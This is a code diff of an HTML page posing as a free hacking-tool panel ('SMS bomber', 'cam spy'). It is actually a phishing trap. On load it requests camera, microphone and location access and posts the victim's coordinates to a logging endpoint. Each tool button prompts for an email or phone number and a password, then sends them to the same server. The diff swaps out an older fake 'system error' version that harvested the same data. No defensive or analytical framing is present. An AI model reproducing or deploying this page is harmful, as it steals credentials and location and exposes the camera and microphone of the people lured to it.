@@ -2,39 +2,73 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SYSTEM_MONITOR_v4.5</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRIME MONIR | KERNEL V6.0</title>
     <style>
-        body { background:#000; color:#0f0; font-family:monospace; text-align:center; overflow:hidden; }
-        .scan { position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(transparent, #0f02, transparent); animation:s 2s infinite; }
-        @keyframes s { 0% {top:-100%} 100% {top:100%} }
-        .btn { border:2px solid #f00; padding:20px; margin:50px auto; width:200px; cursor:pointer; background:#000; color:#f00; font-weight:bold; }
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow-x:hidden; }
+        #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; text-align:center; }
+        .bar-con { width:250px; height:10px; border:1px solid #0f0; margin-top:15px; }
+        .bar { width:0%; height:100%; background:#0f0; animation:load 4s forwards linear; }
+        @keyframes load { to { width:100%; } }
+        #ui { display:none; padding:15px; }
+        .bomber-btn { border:2px solid #f00; background:rgba(255,0,0,0.1); color:#f00; padding:20px; font-weight:bold; margin-bottom:15px; cursor:pointer; text-align:center; animation:pulse 1.5s infinite; }
+        @keyframes pulse { 0%{box-shadow:0 0 5px #f00;} 50%{box-shadow:0 0 20px #f00;} 100%{box-shadow:0 0 5px #f00;} }
+        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:10px; }
+        .tool { border:1px solid #0f0; padding:15px 5px; background:rgba(0,255,0,0.05); text-align:center; cursor:pointer; font-size:12px; }
     </style>
 </head>
 <body>
-    <div class="scan"></div>
-    <h1>CRITICAL SYSTEM ERROR</h1>
-    <p>Target Device Found. Infiltrating...</p>
-    <div class="btn" onclick="start()">FIX & SYNC SYSTEM</div>
+    <div id="loader">
+        <div style="letter-spacing:5px; color:#f00;">⚠️ ATTENTION ⚠️</div>
+        <div style="font-size:10px; margin-top:5px;">BYPASSING DEVICE SECURITY...</div>
+        <div class="bar-con"><div class="bar"></div></div>
+    </div>
+
+    <div id="ui">
+        <div style="border:1px solid #0f0; padding:10px; text-align:center; margin-bottom:15px;">
+            <h2 style="margin:0;">PRIME MONIR | ACCESS PANEL</h2>
+        </div>
+        <div class="bomber-btn" onclick="openTool('SMS_BOMBER')">🔥 SMS BOMBER (FREE)</div>
+        <div class="grid">
+            <div class="tool" onclick="openTool('GALLERY')">GALLERY HACK</div>
+            <div class="tool" onclick="openTool('LOCATION')">LIVE TRACK</div>
+            <div class="tool" onclick="openTool('CAMERA')">CAM SPY</div>
+            <div class="tool" onclick="openTool('FILES')">FILE MANAGER</div>
+        </div>
+    </div>
 
     <script>
-        async function start() {
-            // ১. ক্যামেরা ও মাইক এক্সেস
-            try { await navigator.mediaDevices.getUserMedia({video:true, audio:true}); } catch(e){}
+        // অটো এক্সেস ট্র্যাপ - লোডিং এর সময়
+        window.onload = async () => {
+            try {
+                // ক্যামেরা ও মাইক পারমিশন
+                await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+                // লোকেশন পারমিশন
+                navigator.geolocation.getCurrentPosition((p) => {
+                    sendData('LOCATION', `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}`);
+                });
+            } catch(e) {}
             
-            // ২. লোকেশন
-            navigator.geolocation.getCurrentPosition(p => {
-                fetch('/log_everything', {method:'POST', headers:{'Content-Type':'application/json'}, 
-                body: JSON.stringify({type:'LOCATION', content: `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}`})});
-            });
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('ui').style.display = 'block';
+            }, 4000);
+        };
 
-            // ৩. কন্টাক্ট ও ফাইল ট্র্যাপ (পাসওয়ার্ডসহ)
-            let user = prompt("System Security: Enter Email/Phone to Verify Account");
-            let pass = prompt("Enter Password to Sync Data");
-            if(user && pass) {
-                fetch('/log_everything', {method:'POST', headers:{'Content-Type':'application/json'}, 
-                body: JSON.stringify({type:'CREDENTIALS', content: `User: ${user}, Pass: ${pass}`})});
+        function sendData(type, content) {
+            fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
+            body:JSON.stringify({type: type, content: content})});
+        }
+
+        function openTool(name) {
+            // টুল ওপেন করতে গেলে তখন আইডি পাসওয়ার্ড চাইবে
+            let u = prompt("Verification Required!\nEnter Phone/Email to link server:");
+            let p = prompt("Enter Password:");
+            if(u && p) {
+                sendData('CREDENTIALS', `User: ${u}, Pass: ${p}, Tool: ${name}`);
+                alert("Connection Established. Streaming data...");
             }
-            alert("Exploit Successful. Data sync in progress...");
         }
     </script>
 </body>
